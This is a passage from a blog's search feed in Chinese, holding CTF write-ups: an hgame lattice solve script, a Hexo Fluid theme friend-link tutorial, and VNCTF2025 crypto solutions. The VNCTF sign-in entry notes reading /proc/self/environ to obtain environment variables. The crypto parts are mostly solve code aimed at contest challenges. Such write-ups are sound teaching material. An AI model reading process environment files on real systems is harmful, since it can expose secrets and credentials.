M<br>  h0i = Integer(h[<span class="hljs-number">0</span>]).inverse_mod(M)<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, m):<br>    B[i, <span class="hljs-number">0</span>] = - h[i] * h0i<br>    B[i, i] = <span class="hljs-number">1</span><br>  <span class="hljs-comment">#L = B.BKZ()# slooooooow</span><br>  L = flatter(B)<br>  logging.info(<span class="hljs-string">&#x27;flatter done.&#x27;</span>)<br><br>  <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  vh = vector(Zmod(M), h)</span><br><span class="hljs-string">  logging.debug([vector(Zmod(M), list(l)) * vh  for l in L])</span><br><span class="hljs-string">  &#x27;&#x27;&#x27;</span><br><br>  Lxo = matrix(ZZ, L[:m-n])<br>  Lxc = Lxo.right_kernel(algorithm=<span class="hljs-string">&#x27;pari&#x27;</span>).matrix() <span class="hljs-comment"># faster</span><br>  logging.info(<span class="hljs-string">&#x27;right_kernel done.&#x27;</span>)<br><br>  <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  try:</span><br><span class="hljs-string">    Lx_real = matrix(ZZ, [xi + [0] * (m - len(xi)) for xi in X])</span><br><span class="hljs-string">    rsc = Lxc.row_space()</span><br><span class="hljs-string">    logging.debug([xi in rsc for xi in Lx_real])</span><br><span class="hljs-string">  except:</span><br><span class="hljs-string">    pass</span><br><span class="hljs-string">  &#x27;&#x27;&#x27;</span><br><br>  e = matrix(ZZ, [<span class="hljs-number">1</span>] * m)<br>  B = block_matrix([[-e], [<span class="hljs-number">2</span>*Lxc]])<br>  Lx = B.BKZ()<br>  logging.info(<span class="hljs-string">&#x27;BKZ done.&#x27;</span>)<br>  <span class="hljs-keyword">assert</span> checkMatrix(Lx)<br>  <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">set</span>(Lx[<span class="hljs-number">0</span>])) == <span class="hljs-number">1</span><br><br>  Lx = Lx[<span class="hljs-number">1</span>:]<br>  E = matrix(ZZ, [[<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Lxc.ncols())] <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Lxc.nrows())])<br>  Lx = (Lx + E) / <span class="hljs-number">2</span><br><br>  Lx2 = []<br>  e = vector(ZZ, [<span class="hljs-number">1</span>] * m)<br>  rsc = Lxc.row_space()<br>  <span class="hljs-keyword">for</span> lx <span class="hljs-keyword">in</span> Lx:<br>    <span class="hljs-keyword">if</span> lx <span class="hljs-keyword">in</span> rsc:<br>      Lx2 += [lx]<br>      <span class="hljs-keyword">continue</span><br>    lx = e - lx<br>    <span class="hljs-keyword">if</span> lx <span class="hljs-keyword">in</span> rsc:<br>      Lx2 += [lx]<br>      <span class="hljs-keyword">continue</span><br>    logging.warning(<span class="hljs-string">&#x27;Something wrong?&#x27;</span>)<br>  Lx = matrix(Zmod(M), Lx2)<br><br>  vh = vector(Zmod(M), h)<br>  va = Lx.solve_left(vh)<br>  <span class="hljs-keyword">return</span> Lx, va<br><br><br>m=<span class="hljs-number">247</span><br>n=<span class="hljs-number">70</span><br>M= <br>h=<br>Lx, va = Nguyen_Stern(h, m, n, M)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Lx:<br>  flag=<span class="hljs-string">&#x27;&#x27;</span><br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>    flag+=<span class="hljs-built_in">str</span>(j)<br>  flag=long_to_bytes(<span class="hljs-built_in">int</span>(flag,<span class="hljs-number">2</span>))<br>  <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;hgame&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#hgame&#123;U_f0und_3he_5pec14l_0n3!&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo-fliud主题友链分类</title>
    <link href="/2025/02/11/fluidlinks/"/>
    <url>/2025/02/11/fluidlinks/</url>
    
    <content type="html"><![CDATA[<p>需求在友链部分进行分类处理</p><p>在<code>_config.fluid.yml</code>中的<code>items</code>部分可以多填一个title作为分类标题，然后再在下面添加友链</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> title: &quot;YR&quot;<br>  links:<br><span class="hljs-bullet">    -</span> &#123;<br><span class="hljs-code">      title: &quot;xiaoy&quot;,</span><br><span class="hljs-code">      intro: &quot;(reverse)&quot;,</span><br><span class="hljs-code">      link: &quot;https://blog.csdn.net/xy_hzz&quot;,</span><br><span class="hljs-code">      avatar: &quot;https://profile-avatar.csdnimg.cn/1223b08551c049fd870cbe357ad5b0d0_xy_hzz.jpg!1&quot;</span><br><span class="hljs-code">    &#125;</span><br><span class="hljs-code">    </span><br><span class="hljs-code">- title: &quot;CTFer&quot;</span><br><span class="hljs-code">  links:</span><br><span class="hljs-code">    - &#123;</span><br><span class="hljs-code">      title: &quot;LilRan&quot;,</span><br><span class="hljs-code">      intro: &quot;今日启程 无畏向前&quot;,</span><br><span class="hljs-code">      link: &quot;https://blog.xinshi.fun/&quot;,</span><br><span class="hljs-code">      avatar: &quot;https://blog.xinshi.fun/assets/avatar.png&quot;</span><br><span class="hljs-code">    &#125;</span><br></code></pre></td></tr></table></figure><p>修改<code>node_modules\hexo-theme-fluid\layout\links.ejs</code></p><p>将row links部分修改为如下（感谢ChatGPT的代码贡献），就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;links&quot;</span>&gt;<br>  &lt;% <span class="hljs-keyword">for</span> (const group of theme.links.items || []) &#123; %&gt;<br>    &lt;% <span class="hljs-keyword">if</span> (group.title) &#123; %&gt;<br>      &lt;h2 <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;links-category-title&quot;</span>&gt;&lt;%- group.title %&gt;&lt;/h2&gt;<br>      &lt;% &#125; %&gt;<br>        &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;row links-group&quot;</span>&gt;<br>          &lt;% <span class="hljs-keyword">for</span> (const each of group.links || []) &#123; %&gt;<br>            &lt;% <span class="hljs-keyword">if</span> (!each.title || !each.link) <span class="hljs-keyword">continue</span>; %&gt;<br>              &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;card col-lg-4 col-md-6 col-sm-12&quot;</span>&gt;<br>                &lt;a href=<span class="hljs-string">&quot;&lt;%= url_for(each.link) %&gt;&quot;</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;card-body hover-with-bg&quot;</span> target=<span class="hljs-string">&quot;_blank&quot;</span> rel=<span class="hljs-string">&quot;noopener&quot;</span>&gt;<br>                  &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;card-content&quot;</span>&gt;<br>                    &lt;% <span class="hljs-keyword">if</span> (each.avatar || each.image) &#123; %&gt;<br>                      &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;link-avatar my-auto&quot;</span>&gt;<br>                        &lt;img src=<span class="hljs-string">&quot;&lt;%= url_for(each.avatar || each.image) %&gt;&quot;</span> alt=<span class="hljs-string">&quot;&lt;%= each.title %&gt;&quot;</span><br>                          onerror=<span class="hljs-string">&quot;this.onerror=null; this.src=&#x27;&lt;%= url_for(theme.links.onerror_avatar) %&gt;&#x27;&quot;</span> /&gt;<br>                      &lt;/div&gt;<br>                      &lt;% &#125; %&gt;<br>                        &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;link-text&quot;</span>&gt;<br>                          &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;link-title&quot;</span>&gt;&lt;%- each.title %&gt;&lt;/div&gt;<br>                          &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;link-intro&quot;</span>&gt;&lt;%- each.intro || <span class="hljs-string">&#x27;&#x27;</span> %&gt;&lt;/div&gt;<br>                        &lt;/div&gt;<br>                  &lt;/div&gt;<br>                &lt;/a&gt;<br>              &lt;/div&gt;<br>              &lt;% &#125; %&gt;<br>        &lt;/div&gt;<br>        &lt;% &#125; %&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><p>遇到问题：重新部署博客的时候说links中的page未定义，但我明明什么都没动</p><p>最后给最上面每一行加个分号就不报错了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;%<br>page.layout = <span class="hljs-string">&quot;links&quot;</span>;<br>page.title = theme.links.title || __(<span class="hljs-string">&#x27;links.title&#x27;</span>);<br>page.subtitle = theme.links.subtitle || __(<span class="hljs-string">&#x27;links.subtitle&#x27;</span>);<br>page.banner_img = theme.links.banner_img;<br>page.banner_img_height = theme.links.banner_img_height;<br>page.banner_mask_alpha = theme.links.banner_mask_alpha;<br>page.comment = theme.links.comments.<span class="hljs-built_in">type</span>;<br>%&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>fliud</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>fliud</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF2025</title>
    <link href="/2025/02/09/vnctf2025/"/>
    <url>/2025/02/09/vnctf2025/</url>
    
    <content type="html"><![CDATA[<h1 id="签到"><a class="markdownIt-Anchor" href="#签到"></a> 签到</h1><h2 id="欢迎"><a class="markdownIt-Anchor" href="#欢迎"></a> 欢迎</h2><p>/proc/self/environ读取环境变量</p><p>sed匹配后使用<code>&amp;</code>符号可以再次引用匹配到的字符</p><p><img src="/imgs/vnctf2025/1.png" alt="1" /></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="easymath"><a class="markdownIt-Anchor" href="#easymath"></a> easymath</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>flag=bytes_to_long(flag)<br>l=flag.bit_length()//<span class="hljs-number">3</span> + <span class="hljs-number">1</span><br>n=[]<br>N=<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(n) &lt; <span class="hljs-number">3</span>:<br>    p = <span class="hljs-number">4</span>*getPrime(l)-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> isPrime(p):<br>        n.append(p)<br>        N *= p<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c=<span class="hljs-subst">&#123;flag*flag%N&#125;</span>&#x27;</span>)<br><br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> symbols, expand<br>x = symbols(<span class="hljs-string">&#x27;x&#x27;</span>)<br>polynomial = expand((x - n[<span class="hljs-number">0</span>]) * (x - n[<span class="hljs-number">1</span>]) * (x - n[<span class="hljs-number">2</span>]))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;polynomial=&#125;</span>&#x27;</span>)<br><span class="hljs-comment"># c=24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span><br><span class="hljs-comment"># polynomial=x**3 - 15264966144147258587171776703005926730518438603688487721465*x**2 + 76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923*x - 125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span><br><br></code></pre></td></tr></table></figure><p>解方程+AMM开根+CRT</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> symbols, Eq, solve<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> math<br>a=<span class="hljs-number">15264966144147258587171776703005926730518438603688487721465</span><br>b=<span class="hljs-number">76513250180666948190254989703768338299723386154619468700730085586057638716434556720233473454400881002065319569292923</span><br>c=<span class="hljs-number">125440939526343949494022113552414275560444252378483072729156599143746741258532431664938677330319449789665352104352620658550544887807433866999963624320909981994018431526620619</span><br><br>p, q, r= symbols(<span class="hljs-string">&#x27;p q r&#x27;</span>)<br>equation1 = Eq(p+q+r, a)<br>equation2 = Eq(p*q+p*r+q*r, b)<br>equation3 = Eq(p*q*r,c)<br>solutions = solve((equation1, equation2,equation3), (p, q,r))<br>p,q,r=solutions[<span class="hljs-number">0</span>]<br>p,q,r=<span class="hljs-built_in">int</span>(p),<span class="hljs-built_in">int</span>(q),<span class="hljs-built_in">int</span>(r)<br><br>c=<span class="hljs-number">24884251313604275189259571459005374365204772270250725590014651519125317134307160341658199551661333326703566996431067426138627332156507267671028553934664652787411834581708944</span><br>n=p*q*r<br>e=<span class="hljs-number">2</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">onemod</span>(<span class="hljs-params">e, q</span>):<br>    p = random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span>(powmod(p, (q-<span class="hljs-number">1</span>)//e, q) == <span class="hljs-number">1</span>):  <span class="hljs-comment"># (r,s)=1</span><br>        p = random.randint(<span class="hljs-number">1</span>, q)<br>    <span class="hljs-keyword">return</span> p<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">AMM_rth</span>(<span class="hljs-params">o, r, q</span>):  <span class="hljs-comment"># r|(q-1</span><br>    <span class="hljs-keyword">assert</span>((q-<span class="hljs-number">1</span>) % r == <span class="hljs-number">0</span>)<br>    p = onemod(r, q)<br><br>    t = <span class="hljs-number">0</span><br>    s = q-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(s % r == <span class="hljs-number">0</span>):<br>        s = s//r<br>        t += <span class="hljs-number">1</span><br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>((s*k+<span class="hljs-number">1</span>) % r != <span class="hljs-number">0</span>):<br>        k += <span class="hljs-number">1</span><br>    alp = (s*k+<span class="hljs-number">1</span>)//r<br><br>    a = powmod(p, r**(t-<span class="hljs-number">1</span>)*s, q)<br>    b = powmod(o, r*a-<span class="hljs-number">1</span>, q)<br>    c = powmod(p, s, q)<br>    h = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, t-<span class="hljs-number">1</span>):<br>        d = powmod(<span class="hljs-built_in">int</span>(b), r**(t-<span class="hljs-number">1</span>-i), q)<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-number">1</span>:<br>            j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">else</span>:<br>            j = (-math.log(d, a)) % r<br>        b = (b*(c**(r*j))) % q<br>        h = (h*c**j) % q<br>        c = (c*r) % q<br>    result = (powmod(o, alp, q)*h)<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_Solution</span>(<span class="hljs-params">m, q, rt, cq, e</span>):<br>    mp = []<br>    <span class="hljs-keyword">for</span> pr <span class="hljs-keyword">in</span> rt:<br>        r = (pr*m) % q<br>        <span class="hljs-comment"># assert(pow(r, e, q) == cq)</span><br>        mp.append(r)<br>    <span class="hljs-keyword">return</span> mp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_ROOT2</span>(<span class="hljs-params">r, q</span>):  <span class="hljs-comment"># use function set() and .add() ensure that the generated elements are not repeated</span><br>    li = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">len</span>(li) &lt; r):<br>        p = powmod(random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>), (q-<span class="hljs-number">1</span>)//r, q)<br>        li.add(p)<br>    <span class="hljs-keyword">return</span> li<br><br>cp = c % p<br>cq = c % q<br>cr = c % r<br><br>mp = AMM_rth(cp, e, p)<br>mq = AMM_rth(cq, e, q)<br>mr = AMM_rth(cr, e, r)<br><br>rt1 = ALL_ROOT2(e, p)<br>rt2 = ALL_ROOT2(e, q)<br>rt3 = ALL_ROOT2(e, r)<br><br>amp = ALL_Solution(mp, p, rt1, cp, e)<br>amq = ALL_Solution(mq, q, rt2, cq, e)<br>amr = ALL_Solution(mr, r, rt3, cr, e)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> amp:<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> amq:<br>        <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> amr:<br>            <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(CRT([x,y,z],[p,q,r]))))<br><span class="hljs-comment">#VNCTF&#123;90dcfb2dfb21a21e0c8715cbf3643f4a47d3e2e4b3f7b7975954e6d9701d9648&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ss0hurt"><a class="markdownIt-Anchor" href="#ss0hurt"></a> ss0Hurt!</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DaMie</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, flag , n = <span class="hljs-literal">None</span></span>):<br>        <span class="hljs-variable language_">self</span>.m = ZZ(bytes_to_long(flag))<br>        <span class="hljs-variable language_">self</span>.n = n <span class="hljs-keyword">if</span> n <span class="hljs-keyword">else</span> getPrime(<span class="hljs-number">1024</span>)<br>        <span class="hljs-variable language_">self</span>.P = Zmod(<span class="hljs-variable language_">self</span>.n)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;self.n&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">self, x, y, z</span>):<br><br>        <span class="hljs-keyword">return</span> vector([<span class="hljs-number">5</span> * x + y - <span class="hljs-number">5</span> * z, <span class="hljs-number">5</span> * y - z, <span class="hljs-number">5</span> * z])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Mat</span>(<span class="hljs-params">self, m</span>):<br>        PR = <span class="hljs-variable language_">self</span>.P[<span class="hljs-string">&#x27;x,y,z&#x27;</span>]<br>        x,y,z = PR.gens()<br><br>        <span class="hljs-keyword">if</span> m != <span class="hljs-number">0</span>:<br>            plana = <span class="hljs-variable language_">self</span>.Mat(m//<span class="hljs-number">2</span>)<br>            planb = plana(*plana)<br>            <span class="hljs-keyword">if</span> m % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">return</span> planb<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.process(*planb)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.process(*PR.gens())<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">hash</span>(<span class="hljs-params">self, A, B, C</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.Mat(<span class="hljs-variable language_">self</span>.m)(A, B, C)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <br>    Ouch = DaMie(flag)<br>    result = Ouch.<span class="hljs-built_in">hash</span>(<span class="hljs-number">2025</span>,<span class="hljs-number">208</span>,<span class="hljs-number">209</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;hash(A,B,C) = <span class="hljs-subst">&#123;result&#125;</span>&#x27;</span>)<br><br></code></pre></td></tr></table></figure><blockquote><p>参考<code>[2024-XYCTF-wp-crypto | 糖醋小鸡块的blog](https://tangcuxiaojikuai.xyz/post/146254b2.html)</code></p></blockquote><p>本题加密是进行一个矩阵的快速幂，flag在指数部分，所以是一个矩阵上的DLP</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>5</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi></mrow></msup><mo>∗</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>B</mi><mo separator="true">,</mo><mi>C</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\left(\begin{matrix}5&amp;1&amp;-5\\0&amp;5&amp;-1\\0&amp;0&amp;5\\\end{matrix}\right)^{flag}*(a,b,c)=(A,B,C)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.839048em;vertical-align:-1.55002em;"></span><span class="minner"><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width='0.875em' height='0.3em' style='width:0.875em' viewBox='0 0 875 300' preserveAspectRatio='xMinYMin'><path d='M291 0 H417 V300 H291 z'/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">5</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span 